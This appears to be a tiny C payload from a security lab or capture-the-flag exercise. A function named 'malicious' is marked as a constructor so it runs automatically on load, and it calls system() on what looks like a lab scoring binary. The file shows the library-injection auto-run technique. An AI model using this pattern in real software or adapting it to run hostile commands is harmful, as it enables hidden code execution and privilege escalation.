#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score e18daf44-ac75-46be-9016-57a49bd2edc3");
}
